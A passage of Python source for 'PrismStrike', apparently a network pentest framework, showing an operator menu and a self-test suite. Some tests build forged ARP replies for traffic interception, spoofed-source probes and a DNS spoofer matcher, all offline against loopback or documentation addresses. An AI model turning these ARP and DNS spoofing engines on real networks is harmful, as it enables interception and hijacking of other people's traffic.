                note("nothing to prune - the log directory already holds only recent sessions.")
                continue
            if prompt_yes_no("Delete the %d file(s) listed above?" % len(plan["selected"]), False):
                try:
                    prune_sessions(keep_last=int(keep), older_than_days=float(age), dry_run=False)
                except FrameworkError as exc:
                    err(str(exc))
        elif choice == "5":
            iface_raw = prompt_text("interface (blank = all except lo)", default="", allow_blank=True)
            if iface_raw is PROMPT_ABORT:
                continue
            duration = prompt_float("sampling seconds", 1.0, 3600.0, 10.0)
            if duration is PROMPT_ABORT:
                continue
            interval = prompt_float("sample interval seconds", 0.25, 60.0, 1.0)
            if interval is PROMPT_ABORT:
                continue
            try:
                sampling = throughput_sampler(iface=str(iface_raw).strip() or None,
                                              duration=float(duration), interval=float(interval))
                if not sampling.get("available", True):
                    warn("sampler unavailable here - %s"
                         % sampling.get("reason", "no counter backend responded"))
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "6":
            socket_process_map()
        elif choice == "8":
            push_report_interactive()
        elif choice == "9":
            email_report_interactive()
        elif choice == "10":
            event_sink_console_interactive()
        elif choice == "7":
            heading("OPERATOR QUICK-REFERENCE")
            kv_table([
                ("Journals", "logs/prismstrike_<session>.log.txt + .events.json + .summary.json"),
                ("Artefacts", "logs/artefacts/<session>_<module>_<id>.json (one per scan)"),
                ("HTML report", "logs/report_<session>.html (this module, option 2)"),
                ("Colour control", "--no-color   |   mirror terminal: --mirror-terminal"),
                ("Direct module", "--module icmp|tcp|hping|nmap|sniffer|arp-discovery|arp-spoof"),
                ("", "  |pcap|sysint|logs|doctor|utils|dhcp|dns|wlan|listeners|extras|report"),
                ("Non-destructive validation", "--self-test [--no-live-tests]"),
                ("Unprivileged start", "--allow-unprivileged (raw modules stay gated)"),
                ("Session tag", "--session-tag <suffix> (added to every journal filename)"),
                ("Interrupt handling", "Ctrl-C inside a module returns to the menu; at the menu it ends the session"),
                ("Online capture", "module 08 options 4-6 (live / remote ingest / rolling stream)"),
                ("Remote syslog", "--syslog host:port/tcp  or module 10 option 6 (backfill included)"),
                ("Report delivery", "module 18 options 8-9 (webhook push, SMTP email) or --push-report URL"),
                ("Online freshness", "module 11 option 5 (release API comparison)"),
            ])
            out("")
            out(c("  conventions", "cyan"))
            out("    %s" % c("every module prints a heading, a result table and an artefact path", "grey"))
            out("    %s" % c("targets are validated before any packet is built; typos never crash the loop", "grey"))
            out("    %s" % c("masked secrets are the default; full capture is always an explicit opt-in", "grey"))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# SELF-TEST BATTERY (13 platform checks preserved + 13 extension checks)
# ===========================================================================
def run_self_test(include_live: bool = True, include_nmap: bool = False,
                  verbose: bool = True) -> Dict[str, Any]:
    """
    Exercise every subsystem that can be validated without touching a third
    party: parsing guards, packet construction, journaling, interface and
    kernel reads, ARP frame assembly (never transmitted), loopback capture,
    stream reassembly, service banner grab against a local stub, DHCP/DNS
    framing round-trips, credential masking, report generation and the two new
    housekeeping readers - with optional nmap execution against 127.0.0.1.
    """
    results: List[Dict[str, Any]] = []

    def record(name: str, status: str, detail: str = "") -> None:
        results.append(OrderedDict([("test", name), ("status", status), ("detail", detail)]))
        if verbose:
            badge = {"pass": c(" PASS ", "bgreen", "bold"),
                     "fail": c(" FAIL ", "bred", "bold"),
                     "skip": c(" SKIP ", "byellow", "bold")}.get(status, c(" ???? ", "grey"))
            out("  %s %s %s" % (badge, name.ljust(44), c(detail[:70], "grey")))

    heading("PrismStrike SELF-TEST SUITE")
    out("  host=%s  os=%s  python=%s  root=%s"
        % (platform.node(), platform.system(), platform.python_version(), Privileges.is_root()))
    out("  suite: 57 checks = 15 platform + 25 extension + 17 online (modules 01-18)")
    out("")

    # 1. privilege + environment
    try:
        description = Privileges.describe()
        record("privilege gate & raw socket probe", "pass",
               "euid=%s root=%s raw_socket=%s" % (description["euid"], description["is_root"],
                                                  description["raw_socket_ok"]))
    except Exception as exc:
        record("privilege gate & raw socket probe", "fail", str(exc))

    # 2. input parsing guards
    try:
        assertions = 0
        assert parse_port("443") == 443
        assertions += 1
        assert parse_port_list("22,80,100-102") == [22, 80, 100, 101, 102]
        assertions += 1
        assert parse_ipv4("192.168.0.1") == "192.168.0.1"
        assertions += 1
        assert str(parse_network("10.0.0.5/30")) == "10.0.0.4/30"
        assertions += 1
        assert parse_flag_spec("syn,ack") == "SA"
        assertions += 1
        assert parse_flag_spec("xmas") == "FPU"
        assertions += 1
        assert parse_flag_spec("null") == ""
        assertions += 1
        assert parse_mac("AA-BB-CC-DD-EE-FF") == "aa:bb:cc:dd:ee:ff"
        assertions += 1
        for bad_callable, bad_value in ((parse_port, "99999"), (parse_ipv4, "300.1.1.1"),
                                        (parse_ipv4, "not-an-ip"), (parse_flag_spec, "SYNZ"),
                                        (parse_mac, "zz:zz:zz:zz:zz:zz"), (parse_network, "0" * 40)):
            try:
                bad_callable(bad_value)
                raise AssertionError("validator accepted invalid input '%s'" % bad_value)
            except FrameworkError:
                assertions += 1
        record("input validation guards", "pass", "%d assertions incl. rejection cases" % assertions)
    except (AssertionError, FrameworkError) as exc:
        record("input validation guards", "fail", str(exc))

    # 3. packet construction
    if SCAPY_AVAILABLE:
        try:
            built = 0
            tcp_packet = PacketBuilder.tcp("10.0.0.1", 443, flags="SA", sport=12345, ttl=42,
                                          window=1024, payload=b"selftest", df=True)
            assert tcp_packet[TCP].dport == 443 and str(tcp_packet[TCP].flags) == "SA"
            assert tcp_packet[TCP].sport == 12345 and tcp_packet[IP].ttl == 42
            assert tcp_packet.haslayer(Raw) and tcp_packet[Raw].load == b"selftest"
            assert str(tcp_packet[IP].flags) == "DF"
            built += 1
            udp_packet = PacketBuilder.udp("10.0.0.2", 53, payload=b"query")
            assert udp_packet[UDP].dport == 53 and udp_packet[UDP].sport > 0
            reparsed = IP(bytes(udp_packet))
            assert reparsed[UDP].len == 8 + 5, "UDP length field mismatch: %s" % reparsed[UDP].len
            assert reparsed[UDP].dport == 53
            built += 1
            icmp_packet = PacketBuilder.icmp("10.0.0.3", icmp_type=8, seq=7)
            assert icmp_packet[ICMP].type == 8 and icmp_packet[ICMP].seq == 7
            built += 1
            arp_request = PacketBuilder.arp_request("10.0.0.4")
            assert arp_request[ARP].op == 1 and arp_request[ARP].pdst == "10.0.0.4"
            assert arp_request[Ether].dst == "ff:ff:ff:ff:ff:ff"
            built += 1
            forged = PacketBuilder.arp_reply("10.0.0.4", "aa:bb:cc:dd:ee:ff", "10.0.0.1",
                                             hwsrc="11:22:33:44:55:66")
            assert forged[ARP].op == 2 and forged[ARP].psrc == "10.0.0.1"
            assert forged[Ether].src == "11:22:33:44:55:66"
            built += 1
            decoded = PacketDecoder.decode(tcp_packet)
            assert decoded["protocol"] == "TCP" and decoded["tcp"]["dport"] == 443
            built += 1
            review = ReplyReviewer.review(tcp_packet, time.time())
            assert review["verdict"] in ("OPEN", "ANOMALOUS", "UNFILTERED")
            built += 1
            record("packet construction & dissection", "pass", "%d construction assertions" % built)
        except (AssertionError, FrameworkError) as exc:
            record("packet construction & dissection", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("packet construction & dissection", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("packet construction & dissection", "skip", "scapy unavailable")

    # 4. hping engine assembly (no transmission)
    if SCAPY_AVAILABLE:
        try:
            engine = HpingReplicator(target="10.255.255.1", protocol="tcp", dport=80, flags="S",
                                     count=1, interval=0.0, sport=40000)
            probe, meta = engine.build_probe(0)
            assert probe[TCP].sport == 40000 and probe[TCP].dport == 80
            assert meta["sequence"] == 0 and meta["protocol"] == "tcp"
            assert probe.haslayer(IP)
            icmp_engine = HpingReplicator(target="10.255.255.2", protocol="icmp", count=1)
            icmp_probe, icmp_meta = icmp_engine.build_probe(3)
            assert icmp_probe[ICMP].seq == 3 and icmp_meta["identifier"] == icmp_engine._identifier
            spoofer = HpingReplicator(target="10.255.255.3", protocol="udp", dport=9,
                                      rand_source_prefix="192.0.2.0/28", count=1)
            spoof_probe, spoof_meta = spoofer.build_probe(0)
            assert spoof_meta["spoofed_source"] is True
            assert str(spoof_probe.src).startswith("192.0.2.")
            record("hping replication engine assembly", "pass",
                   "tcp/icmp/udp probes + spoofed-source construction verified")
        except (AssertionError, FrameworkError) as exc:
            record("hping replication engine assembly", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("hping replication engine assembly", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("hping replication engine assembly", "skip", "scapy unavailable")

    # 5. journaling round-trip
    try:
        marker = "selftest-%s" % uuid.uuid4().hex[:8]
        LOGGER.event("selftest", "journal round-trip marker %s" % marker)
        artifact_path = LOGGER.scan("selftest", {"marker": marker, "ok": True}, target="127.0.0.1")
        loaded = {}
        if artifact_path and os.path.exists(artifact_path):
            with open(artifact_path, "r", encoding="utf-8") as handle:
                loaded = json.load(handle)
        assert loaded.get("module") == "selftest", "artefact module field mismatch"
        assert loaded.get("summary", {}).get("marker") == marker, "artefact marker mismatch"
        json_line_found = False
        with open(LOGGER.json_path, "r", encoding="utf-8") as handle:
            for line in handle:
                if marker in line:
                    json.loads(line)
                    json_line_found = True
                    break
        assert json_line_found, "event did not land in the JSON stream"
        record("logging ledger (.txt/.json) round-trip", "pass",
               "artefact + NDJSON verified at %s" % os.path.basename(LOGGER.log_dir))
    except (AssertionError, FrameworkError, OSError, ValueError) as exc:
        record("logging ledger (.txt/.json) round-trip", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 6. interface / route / gateway discovery
    try:
        interfaces = InterfaceManager.list_interfaces()
        gateway = InterfaceManager.discover_gateway()
        local_network = InterfaceManager.local_network()
        assert interfaces, "no interfaces enumerated"
        record("interface, route & gateway discovery", "pass",
               "%d iface(s), gateway=%s, local=%s"
               % (len(interfaces), gateway or "n/a", local_network or "n/a"))
    except (AssertionError, FrameworkError) as exc:
        record("interface, route & gateway discovery", "fail", str(exc))
    except Exception as exc:
        record("interface, route & gateway discovery", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 7. kernel forwarding control (read-only unless a write succeeds and is reverted)
    try:
        forwarding = KernelForwarding()
        status = forwarding.status()
        if not status["available"]:
            record("kernel IP forwarding control", "skip", status["detail"])
        else:
            original = status["current_value"]
            enabled = forwarding.enable()
            restored = forwarding.restore()
            assert forwarding.read() == original, "forwarding value did not return to its original state"
            record("kernel IP forwarding control", "pass",
                   "toggled via %s (%s -> 1 -> %s)" % (status["mechanism"], original, original)
                   if enabled and restored else
                   "read OK via %s (current=%s); toggle test inconclusive" % (status["mechanism"], original))
    except (AssertionError, FrameworkError, OSError) as exc:
        record("kernel IP forwarding control", "fail", "%s" % exc)
    except Exception as exc:
        record("kernel IP forwarding control", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 8. PCAP write/read round-trip
    if SCAPY_AVAILABLE:
        try:
            temp_dir = os.path.join(LOGGER.artifact_dir)
            os.makedirs(temp_dir, exist_ok=True)
            temp_path = os.path.join(temp_dir, "%s_selftest_%s.pcap" % (LOGGER.session_id, uuid.uuid4().hex[:6]))
            sample_packets = [Ether() / PacketBuilder.tcp("198.51.100.10", 443, flags="S"),
                              Ether() / PacketBuilder.udp("198.51.100.11", 53, payload=b"dns"),
                              PacketBuilder.arp_reply("198.51.100.12", "aa:bb:cc:dd:ee:ff",
                                                      "198.51.100.1", hwsrc="11:22:33:44:55:66")]
            wrpcap(temp_path, sample_packets)
            reloaded = rdpcap(temp_path)
            assert len(reloaded) == 3, "pcap packet count mismatch"
            assert reloaded[0].haslayer(TCP) and reloaded[2].haslayer(ARP)
            report = analyse_pcap(temp_path)
            assert report["packets_in_file"] == 3
            record("pcap write/read/analyse round-trip", "pass",
                   "3 packets written and re-analysed (TCP/UDP forged ARP)")
        except (AssertionError, FrameworkError) as exc:
            record("pcap write/read/analyse round-trip", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("pcap write/read/analyse round-trip", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("pcap write/read/analyse round-trip", "skip", "scapy unavailable")

    # 9. live loopback capture (safe: loopback interface only)
    if include_live and SCAPY_AVAILABLE and Privileges.raw_socket_available():
        try:
            captured: List[Any] = []

            def _collect(packet: Any) -> None:
                captured.append(packet)

            def _inject() -> None:
                time.sleep(0.4)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1.0)
                    sock.sendto(b"PrismStrike-SELFTEST", ("127.0.0.1", 47891))
                    sock.close()
                except OSError:
                    return

            injector = threading.Thread(target=_inject, daemon=True)
            injector.start()
            sniff(filter="udp and host 127.0.0.1", prn=_collect, store=False,
                  timeout=4, iface="lo")
            injector.join(timeout=2)
            assert captured, "no loopback packets were captured"
            record("live loopback capture (scapy.sniff)", "pass",
                   "%d loopback packet(s) captured with a live callback" % len(captured))
        except (AssertionError, FrameworkError) as exc:
            record("live loopback capture (scapy.sniff)", "fail", str(exc))
        except Exception as exc:
            record("live loopback capture (scapy.sniff)", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("live loopback capture (scapy.sniff)", "skip",
               "requires root/CAP_NET_RAW or --no-live was requested")

    # 10. live ICMP probe against loopback
    if include_live and SCAPY_AVAILABLE and Privileges.raw_socket_available():
        try:
            reply = sr1(PacketBuilder.icmp("127.0.0.1", seq=1), timeout=2, verbose=0)
            assert reply is not None, "loopback ICMP echo was not answered"
            review = ReplyReviewer.review(reply, time.time())
            assert review["verdict"] == "ECHO-REPLY", "unexpected verdict %s" % review["verdict"]
            record("live ICMP probe (loopback)", "pass",
                   "echo reply classified as %s" % review["verdict"])
        except (AssertionError, FrameworkError) as exc:
            record("live ICMP probe (loopback)", "fail", str(exc))
        except Exception as exc:
            record("live ICMP probe (loopback)", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("live ICMP probe (loopback)", "skip", "requires root/CAP_NET_RAW or --no-live")

    # 11. ARP spoofing engine construction (never transmits during self-test)
    try:
        spoofer = ArpSpoofer(target_ip="192.0.2.10", gateway_ip="192.0.2.1",
                             iface=InterfaceManager.primary_interface() or "lo",
                             target_mac="aa:bb:cc:dd:ee:01", gateway_mac="aa:bb:cc:dd:ee:02")
        frame_target = PacketBuilder.arp_reply(spoofer.target_ip, spoofer.target_mac,
                                               spoofer.gateway_ip, hwsrc=spoofer.our_mac) \
            if SCAPY_AVAILABLE else None
        frame_gateway = PacketBuilder.arp_reply(spoofer.gateway_ip, spoofer.gateway_mac,
                                                spoofer.target_ip, hwsrc=spoofer.our_mac) \
            if SCAPY_AVAILABLE else None
        if SCAPY_AVAILABLE:
            assert frame_target[ARP].op == 2 and frame_target[ARP].psrc == "192.0.2.1"
            assert frame_target[ARP].hwdst == "aa:bb:cc:dd:ee:01"
            assert frame_gateway[ARP].psrc == "192.0.2.10"
            assert frame_gateway[ARP].pdst == "192.0.2.1"
        forwarded = KernelForwarding()
        record("ARP spoofing engine assembly", "pass",
               "bi-directional op=2 frames verified, forwarding mechanism=%s (no frames sent)"
               % (forwarded.mechanism if forwarded.available else "unavailable"))
    except (AssertionError, FrameworkError) as exc:
        record("ARP spoofing engine assembly", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("ARP spoofing engine assembly", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 12. nmap sub-engine
    if include_nmap:
        ready, detail = NmapEngine.capability_report()
        if not ready:
            record("nmap sub-engine (localhost scan)", "skip", detail)
        else:
            try:
                result = NmapEngine.execute("127.0.0.1", "-F -T4", timeout=120)
                assert result["hosts_reported"] >= 1, "nmap returned no host for 127.0.0.1"
                record("nmap sub-engine (localhost scan)", "pass",
                       "python-nmap reported %d host(s), %d port entr(ies)"
                       % (result["hosts_reported"],
                          sum(len(host.get("ports", [])) for host in result["hosts"])))
            except (AssertionError, FrameworkError) as exc:
                record("nmap sub-engine (localhost scan)", "fail", str(exc))
            except Exception as exc:
                record("nmap sub-engine (localhost scan)", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        ready, detail = NmapEngine.capability_report()
        record("nmap sub-engine availability", "pass" if ready else "skip", detail)

    # 13. menu + dispatch integrity (now covers all 17 interactive modules)
    try:
        expected_modules = [module_icmp_recon, module_tcp_crafter, module_hping, module_nmap,
                            module_sniffer, module_arp_discovery, module_arp_spoof,
                            module_pcap_analyst, module_system_intel, module_logging_console,
                            module_dependency_doctor, module_network_utils, module_dhcp,
                            module_dns, module_wireless, module_listeners, module_extras]
        for module_callable in expected_modules:
            assert callable(module_callable), "%s is not callable" % module_callable
        keys = list(MAIN_MENU_TABLE.keys())
        assert len(keys) == len(set(keys)), "duplicate keys in the master menu table"
        known = set(expected_modules)
        for key, (label, handler) in MAIN_MENU_TABLE.items():
            assert isinstance(label, str) and label, "menu entry %s has no label" % key
            if handler in (None, "self-test"):
                continue
            assert callable(handler) and handler in known, \
                "menu entry %s points at an unregistered handler" % key
        record("module dispatch & menu integrity", "pass",
               "%d interactive modules, %d menu entries verified" % (len(expected_modules), len(keys)))
    except (AssertionError, FrameworkError) as exc:
        record("module dispatch & menu integrity", "fail", str(exc))

    # =====================================================================
    # EXTENSION BATTERY - modules 13-18
    # =====================================================================
    out("")
    out(c("  extension battery (v%s - modules 13-18)" % __version__, "bmagenta", "bold"))

    # 14. TCP stream reassembly (ordering, gaps, retransmits, 32-bit wraparound)
    if SCAPY_AVAILABLE:
        try:
            reassembler = StreamReassembler()
            base = 1000
            first = (IP(src="10.1.1.1", dst="10.1.1.2")
                     / TCP(sport=40100, dport=80, flags="PA", seq=base) / Raw(b"HELLO "))
            second = (IP(src="10.1.1.1", dst="10.1.1.2")
                      / TCP(sport=40100, dport=80, flags="PA", seq=base + 6) / Raw(b"WORLD"))
            retransmit = (IP(src="10.1.1.1", dst="10.1.1.2")
                          / TCP(sport=40100, dport=80, flags="PA", seq=base) / Raw(b"HELLO "))
            far = (IP(src="10.1.1.1", dst="10.1.1.2")
                   / TCP(sport=40100, dport=80, flags="PA", seq=base + 40) / Raw(b"TAIL"))
            for packet in (second, first, retransmit, far):
                reassembler.add(packet)
            streams = reassembler.extract(direction="client")
            assert len(streams) == 1, "expected exactly one client stream, got %d" % len(streams)
            payload = list(streams.values())[0]
            assert payload.startswith(b"HELLO WORLD"), "reassembly order wrong: %r" % payload[:32]
            assert b"[<gap 29 bytes>]" in payload, "gap marker missing: %r" % payload
            assert payload.endswith(b"TAIL"), "post-gap segment lost: %r" % payload[-16:]
            wrap = StreamReassembler()
            base_wrap = 0xFFFFFFF0
            for offset, chunk in ((0, b"AAAA"), (4, b"BBBB"), (8, b"CCCC")):
                wrap.add(IP(src="10.2.2.1", dst="10.2.2.2")
                         / TCP(sport=40200, dport=443, flags="PA",
                               seq=(base_wrap + offset) & 0xFFFFFFFF) / Raw(chunk))
            wrapped = list(wrap.extract(direction="client").values())[0]
            assert wrapped == b"AAAABBBBCCCC", "wraparound reassembly wrong: %r" % wrapped
            assert reassembler.summary()["flows"] == 1
            record("module 13: TCP stream reassembly", "pass",
                   "ordering, retransmit collapse, gap marking and seq wraparound verified")
        except (AssertionError, FrameworkError) as exc:
            record("module 13: TCP stream reassembly", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 13: TCP stream reassembly", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("module 13: TCP stream reassembly", "skip", "scapy unavailable")

    # 15. service banner grab against a purpose-built loopback stub
    if include_live:
        stub_socket = None
        try:
            import socketserver as _stub_server
            held: List[int] = [0]

            class _StubHandler(_stub_server.BaseRequestHandler):
                def handle(self) -> None:
                    try:
                        self.request.sendall(b"PrismStrike-STUB-BANNER 220 ready\r\n")
                        time.sleep(0.3)
                    except OSError:
                        return

            stub_server = _stub_server.ThreadingTCPServer(("127.0.0.1", 0), _StubHandler)
            stub_server.daemon_threads = True
            held[0] = int(stub_server.server_address[1])
            threading.Thread(target=stub_server.serve_forever, daemon=True).start()
            try:
                grabbed = banner_grab("127.0.0.1", held[0], timeout=3.0)
            finally:
                try:
                    stub_server.shutdown()
                    stub_server.server_close()
                except OSError:
                    pass
            assert grabbed["connected"] is True, "banner grab could not connect: %s" % grabbed["error"]
            assert "PrismStrike-STUB-BANNER" in grabbed["banner"], \
                "banner not captured: %r" % grabbed["banner"][:60]
            assert grabbed["banner_len"] > 0 and grabbed["response_ms"] is not None
            record("module 13: service banner grab", "pass",
                   "stub service banner captured on 127.0.0.1:%d in %s ms" % (held[0], grabbed["response_ms"]))
        except (AssertionError, FrameworkError) as exc:
            record("module 13: service banner grab", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 13: service banner grab", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_socket is not None:
                try:
                    stub_socket.close()
                except OSError:
                    pass
    else:
        record("module 13: service banner grab", "skip", "--no-live-tests requested")

    # 16. path-MTU discovery (loopback, bounded probe range)
    if include_live and SCAPY_AVAILABLE and Privileges.raw_socket_available():
        try:
            mtu = mtu_path_discovery("127.0.0.1", max_size=2000, min_size=1000, timeout=1.0)
            assert mtu["probes"], "no MTU probes were recorded"
            assert mtu["largest_passing_payload"] is not None, "loopback rejected every probe"
            assert mtu["largest_passing_payload"] >= 1000, "loopback failed a small probe"
            assert mtu["path_mtu_estimate"] == mtu["largest_passing_payload"] + 28, \
                "path MTU estimate does not include the IPv4+ICMP header allowance"
            record("module 13: path-MTU discovery", "pass",
                   "%d DF probes, largest passing payload=%d, estimate=%d bytes"
                   % (len(mtu["probes"]), mtu["largest_passing_payload"], mtu["path_mtu_estimate"]))
        except (AssertionError, FrameworkError) as exc:
            record("module 13: path-MTU discovery", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 13: path-MTU discovery", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("module 13: path-MTU discovery", "skip",
               "requires root/CAP_NET_RAW or --no-live was requested")

    # 17. OS fingerprint engine (evidence extraction + rule scoring, no probe sent)
    if SCAPY_AVAILABLE:
        try:
            fake_reply = (IP(src="192.0.2.50", dst="192.0.2.20", ttl=64, flags="DF")
                          / TCP(sport=443, dport=40000, flags="SA", window=29200,
                                options=[("MSS", 1460), ("SAckOK", b""), ("Timestamp", (1000, 0)),
                                         ("NOP", None), ("WScale", 7)]))
            evidence = OsFingerprinter.extract_evidence(fake_reply)
            assert evidence["received"] is True, "evidence extractor did not mark the reply as received"
            assert evidence["ttl"] == 64 and evidence["window"] == 29200
            assert evidence["mss"] == 1460 and evidence["wscale"] == 7
            assert evidence["sackok"] is True and evidence["timestamps"] is True
            assert len(OsFingerprinter.probe_options()) >= 4, "probe option set is incomplete"
            candidates = OsFingerprinter.classify(evidence)
            assert candidates, "classifier produced no candidates for a Linux-shaped SYN/ACK"
            assert candidates[0]["score"] > 0 and candidates[0]["confidence_percent"] > 0
            assert any("Linux" in entry["family"] for entry in candidates), \
                "Linux rule did not match Linux-shaped evidence"
            record("module 13: OS fingerprint engine", "pass",
                   "evidence + scoring verified; top candidate: %s (%.1f%%)"
                   % (candidates[0]["family"][:40], candidates[0]["confidence_percent"]))
        except (AssertionError, FrameworkError) as exc:
            record("module 13: OS fingerprint engine", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 13: OS fingerprint engine", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("module 13: OS fingerprint engine", "skip", "scapy unavailable")

    # 18. DHCP framing round-trip (build -> serialise -> parse; no transmission)
    if SCAPY_AVAILABLE and DHCP_AVAILABLE:
        try:
            client_mac = "02:11:22:33:44:55"
            discover = DHCPEngine.build_discover(client_mac, xid=0x5EED0001, hostname="prismstrike-selftest")
            reparsed = IP(bytes(discover[IP]))
            assert reparsed[DHCP], "re-serialised discover lost its DHCP layer"
            parsed = DHCPEngine.parse_packet(Ether(bytes(discover)))
            assert parsed is not None, "discover packet could not be parsed back"
            assert parsed["xid"] == 0x5EED0001, "transaction id mismatch after round-trip"
            assert parsed["client_mac"] == client_mac, "chaddr mismatch: %s" % parsed["client_mac"]
            assert str(parsed["message_type"]).upper() == "DISCOVER", \
                "message type mismatch: %s" % parsed["message_type"]
            offer = DHCPEngine.build_offer_or_ack("offer", client_mac, 0x5EED0001, "192.0.2.100",
                                                 "192.0.2.1", 3600, "255.255.255.0",
                                                 "192.0.2.1", "192.0.2.53")
            offer_record = DHCPEngine.parse_packet(offer)
            assert offer_record is not None and offer_record["op"] == 2, "offer op code wrong"
            assert offer_record["yiaddr"] == "192.0.2.100", "yiaddr mismatch: %s" % offer_record["yiaddr"]
            assert str(offer_record["message_type"]).upper() == "OFFER", \
                "offer message type mismatch: %s" % offer_record["message_type"]
            assert offer_record["server_id"] == "192.0.2.1" and offer_record["lease_time"] == 3600
            # RELEASE frames must carry the client's ciaddr and the server id
            release = DHCPEngine.build_release(client_mac, 0x5EED0001, "192.0.2.100", "192.0.2.1")
            release_record = DHCPEngine.parse_packet(release)
            assert release_record is not None and str(release_record["message_type"]).upper() == "RELEASE"
            assert str(release[BOOTP].ciaddr) == "192.0.2.100", \
                "release ciaddr wrong: %s" % release[BOOTP].ciaddr
            record("module 14: DHCP framing round-trip", "pass",
                   "discover/offer/ack/release built, serialised and re-parsed (mac, xid, yiaddr, options)")
        except (AssertionError, FrameworkError) as exc:
            record("module 14: DHCP framing round-trip", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 14: DHCP framing round-trip", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("module 14: DHCP framing round-trip", "skip",
               "scapy BOOTP/DHCP layers unavailable")

    # 19. DNS toolkit primitives (entropy, qtype map, PTR rewrite, query assembly)
    if DNS_LAYERS_AVAILABLE:
        try:
            assert dns_shannon_entropy("aaaaaaaaaaaa") == 0.0, "flat string should have zero entropy"
            assert dns_shannon_entropy("") == 0.0
            high_entropy = dns_shannon_entropy("x7k2jq9wvz4m3p1")
            assert high_entropy >= 3.0, "high-entropy label scored only %.2f" % high_entropy
            assert DNS_QTYPE_MAP["AAAA"] == 28 and DNS_QTYPE_NAMES[16] == "TXT"
            assert DNS_RCODE_NAMES[3] == "NXDOMAIN"
            probe_query = DNS(id=1, rd=1, qd=DNSQR(qname="selftest.prismstrike.invalid", qtype=1))
            assert bytes(probe_query)[:2] == b"\x00\x01", "transaction id not encoded first"
            assert b"selftest" in bytes(probe_query), "question name missing from wire image"
            spoof_probe = DnsSpoofer(iface=None, fake_ip="203.0.113.9",
                                     domains=["example.test", "lab.internal"],
                                     also_nxdomain_domains=["blocked.lab.internal"])
            assert spoof_probe._matches("example.test") is True
            assert spoof_probe._matches("www.deep.example.test") is True
            assert spoof_probe._matches("notexample.test") is False
            assert spoof_probe._matches("unrelated.invalid") is False
            assert spoof_probe._is_nxdomain_target("blocked.lab.internal") is True
            assert spoof_probe._is_nxdomain_target("www.example.test") is False
            wildcard = DnsSpoofer(iface=None, fake_ip="203.0.113.9", domains=[],
                                  answer_everything=True)
            assert wildcard._matches("anything.at.all") is True
            record("module 15: DNS toolkit primitives", "pass",
                   "entropy=%.2f bits/char, qtype/rcode maps and domain matcher verified" % high_entropy)
        except (AssertionError, FrameworkError) as exc:
            record("module 15: DNS toolkit primitives", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 15: DNS toolkit primitives", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("module 15: DNS toolkit primitives", "skip",
               "scapy DNS layers unavailable: %s" % DNS_LAYERS_ERROR)

    # 20. DNS resolver end-to-end against a purpose-built stub nameserver
    if include_live and SCAPY_AVAILABLE and DNS_LAYERS_AVAILABLE and Privileges.raw_socket_available():
        stub_sock = None
        source_sock = None
        seen_questions: List[str] = []
        try:
            stub_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            stub_sock.bind(("127.0.0.1", 0))
            stub_port = int(stub_sock.getsockname()[1])
            stub_sock.settimeout(6.0)
            # Hold the client-side port open as well: with a bound source socket
            # the kernel cannot answer our own probe with an ICMP port-unreachable,
            # and the reply can be verified as having reached the client socket.
            source_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_sock.bind(("127.0.0.1", 0))
            source_port = int(source_sock.getsockname()[1])
            source_sock.settimeout(4.0)

            def _dns_stub() -> None:
                try:
                    data, peer = stub_sock.recvfrom(2048)
                    question = DNS(bytes(data))
                    try:
                        if question.qd is not None:
                            seen_questions.append(_dns_names_to_text(question.qd.qname))
                    except (AttributeError, TypeError):
                        pass
                    reply_payload = DNS(id=int(question.id), qr=1, aa=1, rd=1, ra=1,
                                        qd=question.qd, ancount=1,
                                        an=DNSRR(rrname=question.qd.qname, type="A", ttl=30,
                                                 rdata="203.0.113.77"))
                    # Reply from the same bound socket so the kernel supplies a
                    # correct IP/UDP envelope (source port = the stubbed nameserver
                    # port); only the DNS message itself is written out.
                    stub_sock.sendto(bytes(reply_payload), peer)
                except Exception as exc:
                    LOGGER.event("warn", "DNS stub responder error: %s" % exc, level="WARN")
                finally:
                    try:
                        stub_sock.close()
                    except OSError:
                        pass

            threading.Thread(target=_dns_stub, daemon=True).start()
            answer = dns_query_native("selftest.prismstrike.invalid", "A",
                                      server="127.0.0.1:%d" % stub_port, timeout=5.0,
                                      source_port=source_port)
            assert answer["answered"] is True, "stub nameserver query went unanswered"
            assert answer["rcode"] == "NOERROR", "unexpected rcode %s" % answer["rcode"]
            assert answer["answer_count"] == 1, "answer count %s" % answer["answer_count"]
            assert answer["answers"] and answer["answers"][0]["value"] == "203.0.113.77", \
                "answer value mismatch: %s" % answer["answers"]
            assert answer["answers"][0]["type"] == "A"
            reply_seen = b""
            try:
                reply_seen, _ = source_sock.recvfrom(2048)
            except (socket.timeout, OSError):
                reply_seen = b""
            record("module 15: DNS resolver round-trip", "pass",
                   "query->stub->parse verified on 127.0.0.1:%d, %d-byte reply reached the client socket (%s)"
